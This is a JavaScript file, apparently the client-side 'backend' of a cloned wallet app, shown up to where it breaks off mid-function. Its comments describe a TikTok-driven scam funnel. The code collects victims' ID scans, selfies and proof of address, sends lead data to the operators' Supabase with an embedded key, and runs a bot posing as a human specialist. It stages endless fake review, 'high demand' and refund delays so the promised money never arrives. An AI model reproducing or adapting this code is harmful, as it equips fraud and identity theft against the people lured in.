/* ---------------------------------------------------------------------------
 * wallet-shim.js — o "servidor" do clone, rodando no próprio navegador.
 *
 * O original (wallet.ytaitools.space) é um app Laravel + Supabase. Aqui o
 * FRONT é 100% o mesmo (mesmo HTML, mesmo app.js, mesmo lead.js, mesmo CSS) —
 * só o backend virou este arquivo. Ele é carregado como PRIMEIRO script do
 * <head>, antes do Turbo/Alpine/app.js, então já está de pé quando o app sobe.
 *
 * O que ele faz:
 *   1. Sessão por e-mail (localStorage), com o mesmo gate do original:
 *      sem login → /login;  logado tentando ver /login → volta pra home.
 *   2. Preenche o nome do usuário onde o servidor preenchia (__USER__).
 *   3. Intercepta as chamadas que o app faz pro backend (fetch/sendBeacon/forms)
 *      e responde localmente: tracking, upload de documentos, e o chat de
 *      suporte com a "Sarah Mitchell" respondendo sozinha.
 *
 * Nada sai do aparelho: o tracking do original (Supabase deles) é descartado.
 * ------------------------------------------------------------------------- */
(function () {
  "use strict";

  var LOGIN = "/login";
  var HOME  = "/";

  function ls(fn, fb) { try { return fn(); } catch (e) { return fb; } }

  /* ---- sessão ----------------------------------------------------------- */

  function getUser()  { return ls(function () { return localStorage.getItem("wallet_user") || ""; }, ""); }
  function setUser(e) { ls(function () { localStorage.setItem("wallet_user", e); }); marcarPrimeiroAcesso(); }
  function clearUser(){ ls(function () { localStorage.removeItem("wallet_user"); }); }

  /* Dia em que a pessoa acessou pela 1ª vez — é a data que as transações e a
     review exibem (o Yalo pediu: não usar data fixa). Guardado por e-mail. */
  function chavePrimeiroAcesso() { return "wallet_first_seen:" + getUser(); }
  function marcarPrimeiroAcesso() {
    ls(function () {
      if (!getUser()) return;
      if (!localStorage.getItem(chavePrimeiroAcesso())) {
        localStorage.setItem(chavePrimeiroAcesso(), String(Date.now()));
      }
    });
  }
  function primeiroAcesso() {
    return ls(function () { return Number(localStorage.getItem(chavePrimeiroAcesso())) || Date.now(); }, Date.now());
  }
  // formato MM/DD/YYYY, igual ao original
  function dataUS(ts) {
    var d = new Date(ts);
    var mm = ("0" + (d.getMonth() + 1)).slice(-2);
    var dd = ("0" + d.getDate()).slice(-2);
    return mm + "/" + dd + "/" + d.getFullYear();
  }

  // o nome exibido é a parte antes do @, como no original
  function nameOf(email) {
    var n = (email || "").split("@")[0];
    return n || "there";
  }

  function rota() {
    var p = location.pathname.replace(/\/+$/, "");
    return p === "" ? "/" : p;
  }

  /* Gate de sessão. Roda já (o shim é o 1º script) e de novo a cada visita do
     Turbo. `location.replace` não deixa a página errada nem entrar no histórico. */
  function gate() {
    var logado = !!getUser();
    var p = rota();
    if (!logado && p !== LOGIN) { location.replace(LOGIN); return false; }
    if (logado && p === LOGIN) { location.replace(HOME); return false; }
    return true;
  }
  gate();

  /* ---- Supabase: salva os leads no servidor (não perder nada) ----------- */
  /*
   * Além do localStorage (que é local do navegador), tudo do lead vai pro
   * Supabase do Yalo (projeto funil-tiktok). Assim, se o lead limpar o
   * navegador ou trocar de aparelho, o registro dele continua no servidor.
   *
   * Segurança: a anon key é pública por design (o RLS trava a LEITURA — o
   * anônimo só grava, nunca lê os dados de outros leads). O upsert do lead
   * passa por uma função `wallet_save_lead` (security definer), então não
   * depende de policy ampla e nunca dá erro de RLS.
   *
   * Tudo aqui é fire-and-forget com o fetch ORIGINAL (fetchReal), pra não
   * cair no nosso próprio interceptador e pra nunca travar o funil.
   */
  var SB_URL = "https://vaxyumnweimbfktulfis.supabase.co";
  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZheHl1bW53ZWltYmZrdHVsZmlzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYwMzc3NTgsImV4cCI6MjEwMTYxMzc1OH0.MOiROhurfsHZAhTtOObpVC3_PRJKlSoXSVfIL_KE39U";

  function sbPost(caminho, corpo) {
    ls(function () {
      var f = (typeof fetchReal === "function") ? fetchReal : window.fetch;
      f(SB_URL + caminho, {
        method: "POST",
        // return=minimal: não pede o registro de volta — assim o INSERT não
        // depende de permissão de LEITURA (o anon não tem SELECT, por segurança).
        headers: { "apikey": SB_KEY, "Authorization": "Bearer " + SB_KEY, "Content-Type": "application/json", "Prefer": "return=minimal" },
        body: JSON.stringify(corpo),
        keepalive: true
      }).catch(function () {});
    });
  }

  // grava/atualiza o lead com o estado atual do fluxo
  function sbSalvarLead(extra) {
    if (!getUser()) return;
    // faseAtual (não lerFluxo): aplica as transições por tempo antes de gravar,
    // então o banco reflete a fase real mesmo que o prazo tenha vencido com a
    // pessoa parada em outra tela.
    var f = ls(faseAtual, { phase: "need_docs" }) || { phase: "need_docs" };
    var p = {
      email: getUser(),
      name: nameOf(getUser()),
      funnel: "tiktok-wallet",
      first_seen: new Date(primeiroAcesso()).toISOString(),
      phase: f.phase,
      total_days: f.totalDays != null ? String(f.totalDays) : "",
      due_at: f.dueAt ? new Date(f.dueAt).toISOString() : "",
      cycles: f.cycles != null ? String(f.cycles) : "0",
      user_agent: ls(function () { return navigator.userAgent; }, ""),
      referrer: ls(function () { return document.referrer || ""; }, ""),
      timezone: ls(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; }, "")
    };
    if (extra) Object.keys(extra).forEach(function (k) { p[k] = extra[k]; });
    sbPost("/rest/v1/rpc/wallet_save_lead", { p: p });
  }

  function sbEvento(nome, props) {
    if (!getUser()) return;
    sbPost("/rest/v1/wallet_events", { email: getUser(), name: nome, props: props || {} });
  }
  function sbChat(author, body) {
    if (!getUser()) return;
    sbPost("/rest/v1/wallet_chat", { email: getUser(), author: author, body: body });
  }

  /* ---- preencher o nome do usuário -------------------------------------- */

  /* O servidor renderizava "Hi, fulano" e o nome nas transações. No HTML
     estático isso virou o token __USER__ — troca aqui, sem tocar em nada que
     o Alpine controla (caminha só nós de texto). */
  function preencherNome() {
    ls(function () {
      var nome = nameOf(getUser());
      var data = dataUS(primeiroAcesso());

      var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null);
      var alvo = [];
      var no;
      while ((no = walker.nextNode())) {
        if (no.nodeValue.indexOf("__USER__") !== -1 || no.nodeValue.indexOf("__DATE__") !== -1) alvo.push(no);
      }
      alvo.forEach(function (n) {
        n.nodeValue = n.nodeValue.split("__USER__").join(nome).split("__DATE__").join(data);
      });

      // a inicial do avatar da saudação
      var av = document.querySelector(".greeting__avatar");
      if (av) av.textContent = (nome.charAt(0) || "?").toUpperCase();
    });
  }

  /* ---- login ------------------------------------------------------------ */

  /* O login é um <form method=POST action="/login">. Intercepto no capture,
     antes do Turbo: valida e-mail, grava a sessão e entra. */
  function ehEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v || ""); }

  document.addEventListener("submit", function (e) {
    var form = e.target;
    if (!form || !form.matches) return;

    // --- login ---
    if (form.matches(".login__form") || form.getAttribute("action") === "/login") {
      e.preventDefault();
      e.stopImmediatePropagation();
      var campo = form.querySelector('input[name="email"]');
      var email = (campo && campo.value || "").trim().toLowerCase();
      if (!ehEmail(email)) { if (window.toast) window.toast("Enter a valid email address."); return; }
      setUser(email);
      sbEvento("login");
      irPara(HOME);
      return;
    }

    // --- envio de documentos (verification/submit) ---
    if (form.getAttribute("action") === "/verification/submit") {
      e.preventDefault();
      e.stopImmediatePropagation();
      iniciarProcessamento();      // saque entra em análise: 3 a 9 dias úteis
      sbSalvarLead({ docs_sent: "3", phase: "processing" });
      sbEvento("docs_submitted");
      if (window.toast) window.toast("Documents received. Your withdrawal is being processed.");
      // fecha o sheet de upload, se aberto
      ls(function () {
        var shell = document.querySelector(".app-shell");
        if (shell && window.Alpine) { var d = window.Alpine.$data(shell); if (d) d.uploadOpen = false; }
      });
      setTimeout(function () { irPara("/verification"); }, 900);
      return;
    }

    // --- cartão: pedir (escolheu design/tipo/nome) ---
    if (form.getAttribute("action") === "/cards/order") {
      e.preventDefault(); e.stopImmediatePropagation();
      var g = function (n) { var el = form.querySelector('[name="' + n + '"]'); return el ? el.value : ""; };
      pedirCartao(g("design") || "midnight", g("type") || "virtual", g("holder_name"));
      if (window.toast) window.toast("Card requested. It is now in production.");
      irPara("/cards");
      return;
    }
    // --- cartão: ativar ---
    if (form.getAttribute("action") === "/cards/activate") {
      e.preventDefault(); e.stopImmediatePropagation();
      if (ativarCartao()) { if (window.toast) window.toast("Card activated."); }
      else { if (window.toast) window.toast("Your card is still in production."); }
      irPara("/cards");
      return;
    }
    // --- cartão: adiantar 1 dia (ferramenta de teste) ---
    if (form.getAttribute("action") === "/cards/advance") {
      e.preventDefault(); e.stopImmediatePropagation();
      avancarProducao();
      irPara("/cards");
      return;
    }
  }, true);

  // navega respeitando o Turbo quando existir
  function irPara(url) {
    if (window.Turbo && window.Turbo.visit) window.Turbo.visit(url);
    else location.assign(url);
  }

  /* ---- chat de suporte (Sarah Mitchell responde sozinha) ---------------- */
  /*
   * O app.js original conversa com o servidor assim:
   *   POST /support/chat/messages {body}      -> devolve a MENSAGEM DO USUÁRIO
   *                                              (pra ecoar) + typing:true
   *   GET  /support/chat/messages?after=<id>  -> devolve as mensagens novas do
   *                                              agente que já "chegaram"
   *   GET  /support/status                    -> quantas não lidas
   *   POST /support/chat/typing               -> ignorado
   *
   * Aqui a Sarah responde por palavra-chave (as 10 FAQs reais do próprio
   * suporte do original) com um atraso curto, então o "digitando…" aparece e
   * some de forma natural. Tudo guardado em localStorage por e-mail.
   */

  var AVATAR = "/avatars/support-bot.svg";

  // as respostas — texto tirado do FAQ real do ytaitools
  var FAQ = {
    review:   "The review takes a few days and the timeline varies from account to account. As soon as your documents are submitted, the Verification screen shows which day your review is on and how many days are left.",
    progress: "You can follow it on the Verification tab. It shows the current day, the percentage complete and every review step — they move forward on their own, no need to resubmit or contact anyone.",
    docs:     "Three documents: a government-issued ID (driver's license or passport, front and back), a selfie holding that ID, and a proof of address from the last 90 days.",
    next:     "The review starts the same day and runs step by step: documents received, identity verification, credit review, security check, pre-approval and final review. Each step shows on the Verification tab as it is reached.",
    replace:  "Yes, you can replace a document until the review starts. After it starts the set is locked and the analyst works with what was submitted.",
    withdraw: "The balance stays locked while the account is not verified. It is a security requirement — withdrawals are released only after your identity is confirmed.",
    safe:     "Your documents are used for the account review only, handled by the review team and never shared with other users.",
    second:   "Each person is allowed one account. A second one does not speed anything up — it only puts both accounts under scrutiny. Please wait for the review already running on this account.",
    greeting: "Hello! How can I help with your account review today?",
    thanks:   "You're welcome! Is there anything else I can help you with?",
    human:    "Of course — I'm a specialist and I can help you directly here. What do you need?",
    fallback: "I understand. Your account is under review and the Verification tab shows the current step. Is there anything specific about your account I can help with?"
  };

  function responder(texto) {
    var t = (texto || "").toLowerCase();
    if (/\b(hi|hello|hey|good (morning|afternoon|evening))\b/.test(t)) return FAQ.greeting;
    if (/\b(thank|thanks|thx|obrigad)/.test(t)) return FAQ.thanks;
    if (/(specialist|human|agent|person|someone|talk to)/.test(t)) return FAQ.human;
    if (/(how long|take|days|time|when.*(ready|done|review))/.test(t)) return FAQ.review;
    if (/(document|docs|which.*need|what.*need|id\b|selfie|address|proof)/.test(t)) return FAQ.docs;
    if (/(withdraw|cash ?out|balance|locked|unlock|release|money)/.test(t)) return FAQ.withdraw;
    if (/(progress|status|follow|track|where.*review)/.test(t)) return FAQ.progress;
    if (/(replace|change|re-?upload|resend|wrong.*(doc|photo|file))/.test(t)) return FAQ.replace;
    if (/(safe|secure|privacy|data|share|do you do with)/.test(t)) return FAQ.safe;
    if (/(second|another account|new account|two accounts)/.test(t)) return FAQ.second;
    if (/(next|what happens|after.*submit|submitted)/.test(t)) return FAQ.next;
    return FAQ.fallback;
  }

  function chaveChat() { return "wallet_chat:" + getUser(); }

  function lerFila() {
    return ls(function () { return JSON.parse(localStorage.getItem(chaveChat()) || "[]"); }, []);
  }
  function salvarFila(f) { ls(function () { localStorage.setItem(chaveChat(), JSON.stringify(f)); }); }

  var proximoId = 1000;
  function novoId() {
    var f = lerFila();
    f.forEach(function (m) { if (m.id >= proximoId) proximoId = m.id + 1; });
    return proximoId++;
  }

  function agora() {
    var d = new Date();
    var h = d.getHours(), m = d.getMinutes();
    var ampm = h >= 12 ? "PM" : "AM";
    h = h % 12; if (h === 0) h = 12;
    return h + ":" + (m < 10 ? "0" : "") + m + " " + ampm;
  }
  function dia() {
    return new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });
  }

  // registra a fala do usuário e agenda a resposta da Sarah
  function registrarMensagem(body) {
    var f = lerFila();
    var uMsg = { id: novoId(), author: "user", body: body, time: agora(), day: dia(), deliverAt: Date.now() };
    f.push(uMsg);
    sbChat("user", body);
    var aMsg = { id: novoId(), author: "agent", body: responder(body), time: agora(), day: dia(),
                 sender: { avatar: AVATAR }, deliverAt: Date.now() + 2600 };
    f.push(aMsg);
    sbChat("agent", aMsg.body);
    salvarFila(f);
    return uMsg;
  }

  // as mensagens (do agente) que já passaram do horário de entrega e são > after
  function entregues(after) {
    var t = Date.now();
    return lerFila().filter(function (m) {
      return m.id > after && m.deliverAt <= t && m.author !== "user";
    }).map(function (m) {
      return { id: m.id, author: m.author, body: m.body, time: m.time, day: m.day, sender: m.sender };
    });
  }
  function temDigitando(after) {
    var t = Date.now();
    return lerFila().some(function (m) { return m.id > after && m.author === "agent" && m.deliverAt > t; });
  }
  // não lidas = mensagens do agente entregues e ainda não vistas
  function naoLidas() {
    var visto = ls(function () { return Number(localStorage.getItem("wallet_chat_seen") || 0); }, 0);
    return entregues(visto).length;
  }
  function marcarVisto() {
    var f = lerFila(), max = 0;
    f.forEach(function (m) { if (m.id > max && m.deliverAt <= Date.now()) max = m.id; });
    ls(function () { localStorage.setItem("wallet_chat_seen", String(max)); });
  }

  /* ---- roteador de rede ------------------------------------------------- */

  function json(obj) {
    return new Response(JSON.stringify(obj), { status: 200, headers: { "Content-Type": "application/json" } });
  }

  // decide a resposta local pra uma requisição, ou null pra deixar passar
  function resolver(url, method, corpo) {
    var u = ls(function () { return new URL(url, location.origin); }, null);
    if (!u) return null;
    var host = u.host, p = u.pathname;

    // tracking do ORIGINAL (Supabase DELES) — descarta. O nosso Supabase
    // (SB_HOST) não passa por aqui: a camada de leads usa o fetch original.
    if (host.indexOf("hrlmqwkgruexsxpqmxje") !== -1) return json({ ok: true });

    // só trata rotas da nossa origem
    if (host !== location.host) return null;

    // tracking do app — no-op
    if (p === "/_t/event")   { sbEvento((corpo && corpo.name) || "event", (corpo && corpo.props) || {}); return json({ ok: true }); }
    if (p === "/_t/context") { sbSalvarLead(); return json({ ok: true }); }

    // chat
    if (p === "/support/status") { return json({ unread: naoLidas() }); }
    if (p === "/support/chat/typing") { return json({ ok: true }); }
    if (p === "/support/chat/messages") {
      if (method === "POST") {
        var body = (corpo && corpo.body || "").toString();
        var uMsg = registrarMensagem(body);
        return json({ message: { id: uMsg.id, author: "user", body: uMsg.body, time: uMsg.time, day: uMsg.day }, typing: true });
      }
      var after = Number(u.searchParams.get("after") || 0);
      var msgs = entregues(after);
      if (msgs.length) marcarVisto();
      return json({ messages: msgs, typing: temDigitando(after), handler: null });
    }

    // upload de documentos — aceita (metadata só, como o original)
    if (p === "/verification/documents") { return json({ ok: true, slot: corpo && corpo.slot }); }

    // cartão: congelar/descongelar
    if (p === "/cards/freeze") {
      var cf = lerCartao();
      var frozen = !!(corpo && corpo.frozen);
      if (cf) { cf.frozen = frozen; salvarCartao(cf); }
      return json({ ok: true, status: frozen ? "Frozen" : "In production" });
    }
    // cartão: liga/desliga um controle (contactless, online, atm, international)
    if (p === "/cards/controls") {
      var cc = lerCartao();
      if (cc && corpo && corpo.control) {
        cc.controls = cc.controls || {};
        cc.controls[corpo.control] = !!corpo.enabled;
        salvarCartao(cc);
      }
      return json({ ok: true });
    }

    return null;
  }

  /* ---- monkeypatch de fetch --------------------------------------------- */

  var fetchReal = window.fetch;
  window.fetch = function (input, init) {
    var url = (typeof input === "string") ? input : (input && input.url);
    var method = ((init && init.method) || (input && input.method) || "GET").toUpperCase();
    var corpo = null;
    if (init && init.body && typeof init.body === "string") corpo = ls(function () { return JSON.parse(init.body); }, null);

    var r = ls(function () { return resolver(url, method, corpo); }, null);
    if (r) return Promise.resolve(r);
    return fetchReal.apply(this, arguments);
  };

  /* ---- sendBeacon (o tracking do login usa) ----------------------------- */

  if (navigator.sendBeacon) {
    var beaconReal = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function (url, data) {
      var u = ls(function () { return new URL(url, location.origin); }, null);
      if (u && (u.host.indexOf("hrlmqwkgruexsxpqmxje") !== -1 || u.pathname.indexOf("/_t/") === 0)) return true; // descarta o deles
      return beaconReal(url, data);
    };
  }

  /* ---- logout (não existe no original, mas deixo pronto) ---------------- */
  window.walletLogout = function () { clearUser(); location.replace(LOGIN); };

  /* ======================================================================
   * FLUXO DE SAQUE — a mecânica do funil (sem cobrança).
   *
   * Depois que a pessoa envia os 3 documentos, o saque entra em análise e
   * demora de 7 a 9 dias úteis. Quando esse prazo vence, o app diz que houve um
   * ERRO por excesso de solicitações ("muita gente soube do bônus") e reprograma
   * a liberação por mais 4 a 7 dias úteis (fila de congestionamento, automática).
   * Só quando ESSE segundo prazo vence é que aparece a tela de erro com TENTAR
   * DE NOVO ou SOLICITAR REEMBOLSO. O reembolso "leva de 2 a 5 dias úteis" e,
   * quando vence, cai de volta no mesmo ponto (o dinheiro nunca sai).
   *
   * Estados (localStorage por e-mail):
   *   need_docs   -> ainda não enviou documentos (tela original de upload)
   *   processing  -> saque em análise; conta 7–9 dias úteis; vence -> surge
   *   surge       -> congestionamento ("bônus viralizou"); +4–7 dias úteis; vence -> error
   *   error       -> "erro + reembolso automático" + 2 botões (retry / refund)
   *   refunding   -> reembolso solicitado; conta 2–5 dias úteis; vence -> error
   * ==================================================================== */

  // modo demo (só pra TESTE): ?demo=fast comprime os "dias" em segundos, pra ver
  // o fluxo inteiro sem esperar dias. Fica em sessionStorage — vale só enquanto
  // a aba de teste estiver aberta e NUNCA gruda no funil real. ?demo=off desliga.
  // (limpo qualquer resquício do modo antigo, que grudava em localStorage.)
  var DEMO = ls(function () {
    ls(function () { localStorage.removeItem("wallet_demo"); });   // legado
    var s = location.search || "";
    if (/[?&]demo=off/.test(s))  { ls(function () { sessionStorage.removeItem("wallet_demo"); }); return false; }
    if (/[?&]demo=fast/.test(s)) { ls(function () { sessionStorage.setItem("wallet_demo", "1"); }); return true; }
    return ls(function () { return sessionStorage.getItem("wallet_demo") === "1"; }, false);
  }, false);
  var UM_DIA = DEMO ? 3000 : 24 * 60 * 60 * 1000;   // no demo, 1 "dia" = 3s

  function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

  // soma N dias ÚTEIS a um timestamp (pula sábado e domingo).
  function somarDiasUteis(ts, n) {
    if (DEMO) return ts + n * UM_DIA;                // no demo não pula fim de semana
    var d = new Date(ts), restam = n;
    while (restam > 0) {
      d.setDate(d.getDate() + 1);
      var dia = d.getDay();
      if (dia !== 0 && dia !== 6) restam--;
    }
    return d.getTime();
  }
  // A fração do tempo já decorrida (0..1). Robusto DE PROPÓSITO: usa só os
  // timestamps gravados (startAt/dueAt), então o número NUNCA depende de o modo
  // demo estar ligado ou não no momento da leitura — foi essa mistura de
  // escalas (dueAt gravado em dias reais, lido em "dias" de 3s) que produzia o
  // "Restam 316.776 dias úteis".
  function fracaoDecorrida(f) {
    if (!f || !f.startAt || !f.dueAt || f.dueAt <= f.startAt) return 1;
    var p = (Date.now() - f.startAt) / (f.dueAt - f.startAt);
    return p < 0 ? 0 : (p > 1 ? 1 : p);
  }
  // "Dia X de Y" e "faltam Z" saem da fração × total de dias — sempre dentro de
  // [1..total] e [0..total], nunca um número absurdo.
  function diaCorrente(f) {
    var tot = (f && f.totalDays) ? f.totalDays : 9;
    return Math.min(tot, Math.max(1, Math.ceil(fracaoDecorrida(f) * tot)));
  }
  function diasRestantes(f) {
    var tot = (f && f.totalDays) ? f.totalDays : 9;
    return Math.max(0, tot - Math.floor(fracaoDecorrida(f) * tot));
  }
  function dataCurta(ts) {
    return new Date(ts).toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });
  }

  function fluxoKey() { return "wallet_flow:" + getUser(); }
  function lerFluxo()  { return ls(function () { return JSON.parse(localStorage.getItem(fluxoKey()) || "null"); }, null) || { phase: "need_docs" }; }
  function salvarFluxo(f) { ls(function () { localStorage.setItem(fluxoKey(), JSON.stringify(f)); }); }

  // aplica as transições que dependem só do tempo e devolve a fase atual
  function faseAtual() {
    var f = lerFluxo();
    var t = Date.now();
    // análise venceu -> NÃO cai direto no erro: entra na fila de congestionamento
    if (f.phase === "processing" && f.dueAt && t >= f.dueAt) { iniciarSurge(f); f = lerFluxo(); }
    // congestionamento venceu -> aí sim a tela de erro (tentar de novo / reembolso)
    else if (f.phase === "surge" && f.dueAt && t >= f.dueAt) { f = { phase: "error", cycles: (f.cycles || 1) }; salvarFluxo(f); }
    else if (f.phase === "refunding" && f.dueAt && t >= f.dueAt) { f = { phase: "error", cycles: (f.cycles || 1), afterRefund: true }; salvarFluxo(f); }
    return f;
  }

  function iniciarProcessamento() {
    var dias = randInt(7, 9);
    var start = Date.now();
    salvarFluxo({ phase: "processing", startAt: start, dueAt: somarDiasUteis(start, dias), totalDays: dias, cycles: 1 });
  }
  // fila de congestionamento: "muita gente soube do bônus" -> mais 4 a 7 dias úteis.
  // é automática (sem botões); quando vence, cai na tela de erro (retry/refund).
  function iniciarSurge(prev) {
    var dias = randInt(4, 7);
    var start = Date.now();
    salvarFluxo({ phase: "surge", startAt: start, dueAt: somarDiasUteis(start, dias), totalDays: dias, cycles: (prev && prev.cycles) || 1 });
  }
  function tentarNovamente() {
    var f = lerFluxo();
    var dias = randInt(7, 9);
    var start = Date.now();
    salvarFluxo({ phase: "processing", startAt: start, dueAt: somarDiasUteis(start, dias), totalDays: dias, cycles: (f.cycles || 1) + 1 });
  }
  function solicitarReembolso() {
    var dias = randInt(2, 5);
    var start = Date.now();
    salvarFluxo({ phase: "refunding", startAt: start, dueAt: somarDiasUteis(start, dias), totalDays: dias });
  }

  /* ---- SVGs reaproveitados ---------------------------------------------- */
  var SVG_CHECK = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
  var SVG_X     = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>';
  var SVG_CLOCK = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>';
  var SVG_LOCK  = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>';

  var ETAPAS = [
    { label: "Documents received",   detail: "Your ID, selfie and proof of address were received." },
    { label: "Identity verification", detail: "Confirming the identity on your documents." },
    { label: "Credit review",         detail: "Reviewing the account before releasing funds." },
    { label: "Security check",        detail: "Standard anti-fraud checks on the withdrawal." },
    { label: "Pre-approval",          detail: "Preparing the release of your balance." },
    { label: "Final review",          detail: "Last step before the payout is sent." }
  ];

  // monta a timeline de acordo com o quanto do prazo já passou (0..1)
  function timelineHTML(prog, negada) {
    var atual = Math.min(ETAPAS.length - 1, Math.floor(prog * ETAPAS.length));
    var linhas = ETAPAS.map(function (e, i) {
      var cls, marca, status;
      if (negada && i === ETAPAS.length - 1) { cls = "timeline__item--denied"; marca = SVG_X; status = "Failed"; }
      else if (i < atual) { cls = "timeline__item--completed"; marca = SVG_CHECK; status = "Done"; }
      else if (i === atual && !negada) { cls = "timeline__item--current"; marca = SVG_CLOCK; status = "In progress"; }
      else { cls = "timeline__item--pending"; marca = SVG_CLOCK; status = "Pending"; }
      return '<div class="timeline__item ' + cls + '">' +
               '<span class="timeline__marker">' + marca + '</span>' +
               '<div class="timeline__body">' +
                 '<p class="timeline__label">' + e.label + '</p>' +
                 '<p class="timeline__detail">' + e.detail + '</p>' +
                 '<span class="timeline__status">' + status + '</span>' +
               '</div></div>';
    }).join("");
    return '<div class="timeline' + (negada ? ' timeline--terminal' : '') + '">' + linhas + '</div>';
  }

  /* ---- as telas de cada fase (conteúdo do <section.screen>) ------------- */

  function telaProcessing(f) {
    var restam = diasRestantes(f);
    var passados = diaCorrente(f);
    var prog = Math.min(0.98, fracaoDecorrida(f));
    var pct = Math.round(prog * 100);
    return '' +
      '<h1 class="screen__title">Withdrawal</h1>' +
      '<div class="alert-banner alert-banner--warning enter" style="--i:0" role="note">' +
        '<span class="alert-banner__icon">' + SVG_CLOCK + '</span>' +
        '<div class="alert-banner__body">' +
          '<strong class="alert-banner__title">Withdrawal under review</strong>' +
          '<p class="alert-banner__text">Your withdrawal is being processed. This takes <strong>7 to 9 business days</strong>. You do not need to do anything — the steps below advance on their own.</p>' +
        '</div>' +
      '</div>' +
      '<div class="progress enter" style="--i:1">' +
        '<span class="progress__label">Withdrawal review</span>' +
        '<div class="progress__head">' +
          '<span class="progress__day">Day ' + Math.max(1, passados) + ' of ' + (f.totalDays || 9) + '</span>' +
          '<span class="progress__pct">' + pct + '%</span>' +
        '</div>' +
        '<div class="progress__track"><span class="progress__fill" style="width:' + pct + '%"></span></div>' +
        '<p class="progress__note">Estimated release by <strong>' + dataCurta(f.dueAt) + '</strong> · ' +
          (restam <= 1 ? 'less than a day left' : restam + ' business days left') + '</p>' +
      '</div>' +
      '<div class="enter" style="--i:2">' + timelineHTML(prog, false) + '</div>';
  }

  // fila de congestionamento: "deu um erro, muita gente soube do bônus, aguarde
  // mais 4–7 dias úteis — o sistema está cheio, mas vai liberar". Automática.
  function telaSurge(f) {
    var restam = diasRestantes(f);
    var passados = diaCorrente(f);
    var prog = Math.min(0.98, fracaoDecorrida(f));
    var pct = Math.round(prog * 100);
    return '' +
      '<h1 class="screen__title">Withdrawal</h1>' +
      '<div class="alert-banner alert-banner--warning enter" style="--i:0" role="alert">' +
        '<span class="alert-banner__icon">' + SVG_CLOCK + '</span>' +
        '<div class="alert-banner__body">' +
          '<strong class="alert-banner__title">Withdrawal delayed — unusually high demand</strong>' +
          '<p class="alert-banner__text">We hit an error releasing your withdrawal: we received a huge number of requests — a lot of people found out about the bonus. Your release was rescheduled and now takes <strong>4 to 7 more business days</strong>. You do not need to do anything — as soon as the queue clears, your balance is released automatically.</p>' +
        '</div>' +
      '</div>' +
      '<div class="progress enter" style="--i:1">' +
        '<span class="progress__label">Release queue</span>' +
        '<div class="progress__head">' +
          '<span class="progress__day">Day ' + Math.max(1, passados) + ' of ' + (f.totalDays || 7) + '</span>' +
          '<span class="progress__pct">' + pct + '%</span>' +
        '</div>' +
        '<div class="progress__track"><span class="progress__fill" style="width:' + pct + '%"></span></div>' +
        '<p class="progress__note">New estimated release by <strong>' + dataCurta(f.dueAt) + '</strong> · ' +
          (restam <= 1 ? 'less than a day left' : restam + ' business days left') + '</p>' +
      '</div>' +
      '<div class="alert-banner enter" style="--i:2" role="note">' +
        '<span class="alert-banner__icon">' + SVG_CLOCK + '</span>' +
        '<div class="alert-banner__body">' +
          '<strong class="alert-banner__title">The system is overloaded right now</strong>' +
          '<p class="alert-banner__text">Because of the volume, payouts are taking longer than usual — but your withdrawal is confirmed and <strong>will be released</strong>. Thanks for your patience.</p>' +
        '</div>' +
      '</div>';
  }

  function telaErro(f) {
    return '' +
      '<h1 class="screen__title">Withdrawal</h1>' +
      '<div class="alert-banner alert-banner--danger enter" style="--i:0" role="alert">' +
        '<span class="alert-banner__icon">' + SVG_X + '</span>' +
        '<div class="alert-banner__body">' +
          '<strong class="alert-banner__title">There was an error with your withdrawal</strong>' +
          '<p class="alert-banner__text">We could not complete the payout. An <strong>automatic refund has been issued</strong> to reverse the transaction.</p>' +
        '</div>' +
      '</div>' +
      '<div class="progress enter" style="--i:1">' +
        '<span class="progress__label">Refund</span>' +
        '<div class="progress__head"><span class="progress__day">Reversal</span>' +
          '<span class="badge badge--warning">Pending</span></div>' +
        '<p class="progress__note">The refund takes <strong>2 to 5 business days</strong> to arrive back in your account.</p>' +
      '</div>' +
      '<div class="enter" style="--i:2">' + timelineHTML(1, true) + '</div>' +
      '<div class="stack enter" style="--i:3" style="margin-top:var(--space-4)">' +
        '<button type="button" class="btn btn--primary btn--full" data-flow="retry">Try again</button>' +
        '<button type="button" class="btn btn--ghost btn--full" data-flow="refund" style="margin-top:var(--space-3)">Request refund</button>' +
      '</div>';
  }

  function telaRefunding(f) {
    var restam = diasRestantes(f);
    var prog = Math.min(0.98, fracaoDecorrida(f));
    var pct = Math.round(prog * 100);
    return '' +
      '<h1 class="screen__title">Refund</h1>' +
      '<div class="alert-banner alert-banner--success enter" style="--i:0" role="note">' +
        '<span class="alert-banner__icon">' + SVG_CHECK + '</span>' +
        '<div class="alert-banner__body">' +
          '<strong class="alert-banner__title">Refund requested</strong>' +
          '<p class="alert-banner__text">Your refund is on the way. It takes <strong>2 to 5 business days</strong> to arrive back in your account.</p>' +
        '</div>' +
      '</div>' +
      '<div class="progress enter" style="--i:1">' +
        '<span class="progress__label">Refund status</span>' +
        '<div class="progress__head"><span class="progress__day">' +
